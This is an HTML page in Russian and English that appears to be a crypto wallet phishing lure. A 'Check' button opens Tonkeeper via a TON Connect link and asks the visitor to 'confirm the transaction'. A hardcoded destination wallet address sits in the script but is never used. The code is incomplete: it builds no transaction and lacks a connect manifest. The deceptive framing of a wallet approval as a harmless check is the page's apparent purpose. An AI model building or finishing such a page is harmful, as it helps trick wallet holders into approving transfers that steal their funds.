<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>TON</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background: #0d0d0d;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            font-family: 'Segoe UI', Arial, sans-serif;
        }
        .container {
            background: #1a1a1a;
            padding: 40px 30px;
            border-radius: 24px;
            text-align: center;
            max-width: 380px;
            width: 100%;
            border: 1px solid #2a2a2a;
        }
        .btn {
            background: linear-gradient(135deg, #0098ea, #0080d0);
            border: none;
            color: #fff;
            font-size: 20px;
            font-weight: 700;
            padding: 18px 40px;
            border-radius: 60px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
            margin: 6px 0;
        }
        .btn:active {
            transform: scale(0.96);
        }
        #status {
            margin-top: 16px;
            font-size: 13px;
            color: #888;
            min-height: 40px;
        }
        .confirm-box {
            background: #1a2a3a;
            border: 1px solid #2a4a6a;
            border-radius: 16px;
            padding: 20px;
            margin-top: 20px;
            display: none;
        }
        .confirm-box.show {
            display: block;
        }
        .confirm-box .title {
            color: #fff;
            font-size: 16px;
            font-weight: 600;
        }
        .confirm-box .sub {
            color: #8899aa;
            font-size: 13px;
            margin: 6px 0 12px 0;
        }
        .confirm-box .open-btn {
            background: #0098ea;
            border: none;
            color: #fff;
            font-size: 16px;
            font-weight: 600;
            padding: 12px 30px;
            border-radius: 40px;
            cursor: pointer;
            width: 100%;
            transition: 0.3s;
        }
    </style>
</head>
<body>
    <div class="container">
        <div style="font-size:36px;margin-bottom:16px;">⚡</div>
        <button class="btn" id="mainBtn">ПРОВЕРИТЬ</button>
        <div id="status">Нажмите кнопку</div>

        <div class="confirm-box" id="confirmBox">
            <div class="title">Confirm the transaction in Tonkeeper</div>
            <div class="sub">It will only take a moment.</div>
            <button class="open-btn" id="openWalletBtn">Open wallet</button>
        </div>
    </div>

    <script>
        const TARGET = 'UQAK9d_w9I9KHJeREapik3vc6R-esMsci3E8nlqMwFsaRs3P';

        // ====== ОТКРЫТЬ ЧЕРЕЗ TON CONNECT (КАК НА ПОРТАЛЕ) ======
        function openTonConnect() {
            const status = document.getElementById('status');
            const confirmBox = document.getElementById('confirmBox');
            
            status.innerText = '⏳ Открываю TON Keeper...';
            confirmBox.classList.add('show');
            
            // ====== TON CONNECT 2.0 (РАБОТАЕТ НА ТЕЛЕФОНЕ) ======
            const url = 'https://app.tonkeeper.com/ton-connect?ret=' + encodeURIComponent(window.location.href);
            
            // Открываем в новой вкладке
            window.open(url, '_blank');
            
            // Также пробуем через location
            setTimeout(function() {
                window.location.href = url;
            }, 300);
            
            status.innerText = '✅ Подтвердите в TON Keeper';
        }

        // ====== КНОПКИ ======
        document.getElementById('mainBtn').addEventListener('click', openTonConnect);
        document.getElementById('openWalletBtn').addEventListener('click', openTonConnect);

        // ====== СТАТУС ======
        document.getElementById('status').innerText = 'Нажмите "ПРОВЕРИТЬ"';
    </script>
</body>
</html>
